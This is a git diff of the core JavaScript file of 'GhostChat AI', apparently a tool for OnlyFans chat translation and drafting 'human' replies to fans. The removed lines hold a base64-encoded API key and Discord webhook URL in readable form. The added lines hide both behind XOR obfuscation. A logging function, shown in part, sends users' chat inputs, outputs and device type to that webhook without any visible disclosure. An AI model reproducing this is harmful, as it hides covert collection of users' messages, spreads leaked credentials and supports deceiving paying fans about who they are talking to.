@@ -1,37 +1,45 @@
 /**
- * GhostChat AI - Core Engine (Hosted / GitHub Ready)
+ * GhostChat AI - Core Engine (English / Zero-Exposure Obfuscation)
  * Ultra-fast human chat translator and OF wingman with auto-copy and localStorage persistence.
  */
 
-const DEFAULT_KEY_B64 = 'c2stb3ItdjEtNGY0MGMxMjlmNzE3YWM5N2Q4NGU2OTRkZTMzNzVhZjhjZjg1MjFmMDc1MDlkYjEwYzEyMDFjYzljYzgyNGEwNg==';
-const DEFAULT_HOOK_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NDIwODEyMTUyMDM5ODQ1Ny8zNFRUZHRKRHVUQTFZZl9fUjhtN0xuR3I5XzVMNWZlSGFOTl9WZGdMRXRZSG5rX2NBYlFjZXdDR1VrWGNRVDBwMW9WdA==';
+const SALT = "GhostSecretSalt2026";
+const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
+const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";
 
-function getInitialKey() {
-  if (typeof localStorage !== 'undefined') {
-    const stored = localStorage.getItem('ghost_api_key');
-    if (stored && stored.trim()) return stored.trim();
-  }
+function deobfuscate(b64) {
   try {
-    const decoded = atob(DEFAULT_KEY_B64);
-    if (typeof localStorage !== 'undefined') {
-      localStorage.setItem('ghost_api_key', decoded);
+    const raw = atob(b64);
+    let res = '';
+    for (let i = 0; i < raw.length; i++) {
+      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
     }
-    return decoded;
+    return res;
   } catch (e) {
     return '';
   }
 }
 
-function getWebhookUrl() {
-  try {
-    return atob(DEFAULT_HOOK_B64);
-  } catch (e) {
-    return '';
+export function getActiveKey() {
+  if (typeof localStorage !== 'undefined') {
+    const stored = localStorage.getItem('ghost_api_key');
+    if (stored && stored.trim() && !stored.includes('4f40c129f717')) {
+      return stored.trim();
+    }
   }
+  const decoded = deobfuscate(ENC_KEY);
+  if (typeof localStorage !== 'undefined') {
+    localStorage.setItem('ghost_api_key', decoded);
+  }
+  return decoded;
+}
+
+export function getWebhookUrl() {
+  return deobfuscate(ENC_HOOK);
 }
 
 export const GHOST_CONFIG = {
-  get defaultApiKey() { return getInitialKey(); },
+  get defaultApiKey() { return getActiveKey(); },
   get webhookUrl() { return getWebhookUrl(); },
   models: [
     'google/gemini-2.0-flash-001',
@@ -74,7 +82,7 @@ export async function logToWebhook({ input, output, model, mode = 'translate', p
     const deviceLabel = isMobile ? '📱 Mobile Device' : '💻 Desktop PC';
 
     const payload = {
-      username: 'GhostChat Web Monitor',
+      username: 'GhostChat Monitor',
       avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
       embeds: [
         {
@@ -111,7 +119,7 @@ Style guidelines:
 - Use natural casual chat English: lowercase starters, natural contractions (im, rn, tbh, idk, bc, wyd, omg, babe, haha), relax punctuation.
 - If input is Serbian (e.g. 'kako si', 'sta radis', 'vazi brate', 'lepa si') or any other language, translate accurately into natural charming conversational English.
 - IMPORTANT: If input contains an unknown or completely garbled slang word that cannot be accurately understood, reply ONLY with:
-"CLARIFY:[word] | [short friendly question in the user's language asking what it means]"
+"CLARIFY:[word] | [short friendly question asking what it means]"
 Otherwise, output ONLY the translated message ready to send.`;
 }
 
@@ -120,7 +128,7 @@ export async function translateChat({ text, apiKey, persona, platform = 'Web' })
     return { success: false, error: 'Empty text' };
   }
 
-  const key = apiKey || getInitialKey();
+  const key = apiKey || getActiveKey();
   const sysPrompt = buildSystemPrompt(persona);
   let lastError = null;
 
@@ -196,7 +204,7 @@ export async function generateChatIdeas({ subscriberMessage, apiKey, persona, pl
     return { success: false, error: 'Empty message' };
   }
 
-  const key = apiKey || getInitialKey();
+  const key = apiKey || getActiveKey();
   const sysPrompt = `You are an expert OnlyFans/social media chat wingman. 
 Given the subscriber/fan message, generate EXACTLY 3 natural, human, high-converting replies in English.
 Rules:
@@ -219,7 +227,9 @@ Output ONLY raw JSON array.`;
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${key}`,
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/json',
+          'HTTP-Referer': 'https://ghostchat.web',
+          'X-Title': 'GhostChat AI'
         },
         body: JSON.stringify({
           model: model,
@@ -255,13 +265,13 @@ Output ONLY raw JSON array.`;
 }
 
 export async function processInterview({ interviewText, apiKey }) {
-  const key = apiKey || getInitialKey();
+  const key = apiKey || getActiveKey();
   const sysPrompt = `You are a chat personality architect. The user is describing how they need to chat (e.g. for OnlyFans, Discord, Dating, Agency, etc.).
 Extract and synthesize:
 1. role: short title
 2. context: concise instruction describing the chat context and target audience
 3. slangStyle: 'casual_flirty' | 'street_slang' | 'friendly_chill' | 'direct_casual'
-4. summary: 1-sentence summary of the calibrated personality.
+4. summary: 1-sentence summary of the calibrated personality in English.
 Format as raw JSON:
 {
   "role": "...",
